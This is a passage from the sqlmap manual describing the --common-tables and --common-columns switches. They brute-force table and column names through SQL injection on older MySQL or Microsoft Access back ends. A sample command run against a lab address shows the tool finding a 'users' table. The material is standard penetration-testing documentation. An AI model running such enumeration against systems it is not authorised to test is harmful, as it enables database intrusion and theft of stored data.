## Brute force

These switches can be used to run brute force checks.

### Brute force tables names

Switch: `--common-tables`

There are cases where switch `--tables` can not be used to retrieve the databases' table names. These cases usually fit into one of the following categories: 

* The database management system is MySQL **< 5.0** where `information_schema` is not available.
* The database management system is Microsoft Access and system table `MSysObjects` is not readable - default setting.
* The session user does not have read privileges against the system table storing the scheme of the databases.

If any of the first two cases apply and you provided the switch `--tables`, sqlmap will prompt you with a question
to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch `--common-tables`. sqlmap will perform a brute-force attack in order to detect the existence of common tables across the DBMS.

The list of common table names is `txt/common-tables.txt` and you can edit it as you wish.

Example against a MySQL 4.1 target:

```
$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --commo\
n-tables -D testdb --banner

[...]
[hh:mm:39] [INFO] testing MySQL
[hh:mm:39] [INFO] confirming MySQL
[hh:mm:40] [INFO] the back-end DBMS is MySQL
[hh:mm:40] [INFO] fetching banner
web server operating system: Windows
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS operating system: Windows
back-end DBMS: MySQL < 5.0.0
banner:    '4.1.21-community-nt'

[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/tx
t/common-tables.txt'
[hh:mm:40] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 8
[hh:mm:43] [INFO] retrieved: users

Database: testdb
[1 table]
+-------+
| users |
+-------+
```

### Brute force columns names

Switch: `--common-columns`

As per tables, there are cases where switch `--columns` can not be used to retrieve the databases' tables' column names. These cases usually fit into one of the following categories: 

* The database management system is MySQL **< 5.0** where `information_schema` is not available.
* The database management system is Microsoft Access where this kind of information is not available inside system tables.
* The session user does not have read privileges against the system table storing the scheme of the databases.

If any of the first two cases apply and you provided the switch `--columns`, sqlmap will prompt you with a question
to fall back to this technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch `--common-columns`. sqlmap will perform a brute-force attack in order to detect the existence of common columns across the DBMS.

The list of common table names is `txt/common-columns.txt` and you can edit it as you wish.